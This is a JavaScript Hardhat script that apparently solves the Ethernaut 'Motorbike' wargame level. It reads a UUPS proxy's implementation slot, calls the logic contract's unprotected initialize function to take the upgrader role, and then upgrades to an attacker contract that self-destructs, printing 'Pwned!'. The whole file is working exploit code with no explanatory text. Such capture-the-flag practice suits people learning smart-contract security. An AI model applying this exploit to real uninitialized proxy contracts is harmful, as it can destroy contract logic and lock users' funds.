const { providers } = require("ethers")
const { ethers } = require("hardhat")

const motorbikeInstanceAddress = "0xC14c3b9b0Db2161c7B79656ac4B48Af0e609ffF0"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Getting Motorbike and Engine */

  console.log("Connecting to your instance of Motorbike")
  const Motorbike = await ethers.getContractFactory("Motorbike")
  const motorbike = await Motorbike.attach(motorbikeInstanceAddress)

  console.log("Getting Engine instance from storage slot specified in IMPLEMENTATAION_SLOT")
  const implementationSlot = await ethers.provider.getStorageAt(
    motorbikeInstanceAddress,
    ethers.utils.hexlify("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
  )
  const engineAddress = "0x" + implementationSlot.slice(-40)
  console.log("Engine address: " + engineAddress)

  /* Initializing the Engine */

  console.log("Getting signature of initialize function from Engine")
  const Engine = await ethers.getContractFactory("Engine")
  const initializeSignature = Engine.interface.encodeFunctionData("initialize", [])

  console.log("Sending encoded 'initialize' to Engine...")
  const initializeTxData = {
    to: engineAddress,
    data: initializeSignature,
  }
  const initializeTx = await deployer.sendTransaction(initializeTxData)
  await initializeTx.wait(1)

  console.log("We initialized the contract, so now we're the upgrader!")

  /* Deploying the attacker contract */

  console.log("Koffing, I choose you...")
  await deployments.fixture("motorbike")
  const koffing = await ethers.getContract("Koffing", deployer)

  /* Attacking as described in console */

  console.log("Preparing to upgrade from Engine to Koffing and then calling selfDestruct...")
  const selfDestructeSignature = koffing.interface.encodeFunctionData("selfDestruct", [])

  const upgradeToAndCallSignature = Engine.interface.encodeFunctionData("upgradeToAndCall", [
    koffing.address,
    selfDestructeSignature,
  ])

  console.log("Sending maliciously encoded 'upgradeToAndCall' to Engine...")
  const upgradeToAndCallTxData = {
    to: engineAddress,
    data: upgradeToAndCallSignature,
  }
  const upgradeToAndCallTx = await deployer.sendTransaction(upgradeToAndCallTxData)
  await upgradeToAndCallTx.wait(1)

  console.log("Koffing, self-destruct!")

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
